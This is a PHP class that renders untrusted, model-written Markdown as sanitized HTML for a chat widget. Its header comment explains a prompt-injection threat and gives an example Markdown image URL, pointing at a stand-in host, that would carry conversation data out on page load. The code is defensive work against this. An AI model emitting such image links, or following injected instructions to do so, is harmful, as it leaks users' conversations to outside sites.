<?php

declare(strict_types=1);

namespace Bladewell\Support;

use League\CommonMark\Environment\Environment;
use League\CommonMark\Event\DocumentParsedEvent;
use League\CommonMark\Extension\Autolink\AutolinkExtension;
use League\CommonMark\Extension\CommonMark\CommonMarkCoreExtension;
use League\CommonMark\Extension\CommonMark\Node\Inline\Image;
use League\CommonMark\Extension\ExternalLink\ExternalLinkExtension;
use League\CommonMark\Extension\Strikethrough\StrikethroughExtension;
use League\CommonMark\MarkdownConverter;

/**
 * Markdown from someone you can't trust, such as a model, as HTML <x-widget.chat.message> can show. What a model writes
 * can be steered by a page or file it read, so:
 * - HTML in the text is dropped, and javascript:, vbscript:, file: and data: links lose their link.
 * - Images keep only their description: a reply can't make the browser load anything, which is how a steered model
 *   would send the conversation to another site (![](https://example.com/?data=…) loads with no click).
 * - Links to other sites open in a new tab, with rel="nofollow noopener noreferrer".
 * Without league/commonmark (every Laravel app has it, through laravel/framework), the text is shown as it is, escaped.
 */
final class ChatMarkdown
{
    public static function toHtml(string $markdown, ?string $siteHost = null): string
    {
        if (! class_exists(MarkdownConverter::class)) {
            return '<p>'.nl2br(e($markdown), false).'</p>';
        }

        $environment = new Environment([
            'html_input' => 'strip',
            'allow_unsafe_links' => false,
            // Deeply nested lists and quotes cost the parser more and more: a reply can't nest past this.
            'max_nesting_level' => 20,
            'external_link' => [
                'internal_hosts' => array_values(array_filter([$siteHost ?? request()->getHost()])),
                'open_in_new_window' => true,
                'nofollow' => 'external',
                'noopener' => 'external',
                'noreferrer' => 'external',
            ],
        ]);
        $environment->addExtension(new CommonMarkCoreExtension);
        $environment->addExtension(new AutolinkExtension);
        $environment->addExtension(new StrikethroughExtension);
        $environment->addExtension(new ExternalLinkExtension);
        $environment->addEventListener(DocumentParsedEvent::class, static function (DocumentParsedEvent $event): void {
            $images = [];
            foreach ($event->getDocument()->iterator() as $node) {
                if ($node instanceof Image) {
                    $images[] = $node;
                }
            }
            foreach ($images as $image) {
                while ($image->firstChild() !== null) {
                    $image->insertBefore($image->firstChild());
                }
                $image->detach();
            }
        });

        return (string) (new MarkdownConverter($environment))->convert($markdown);
    }
}
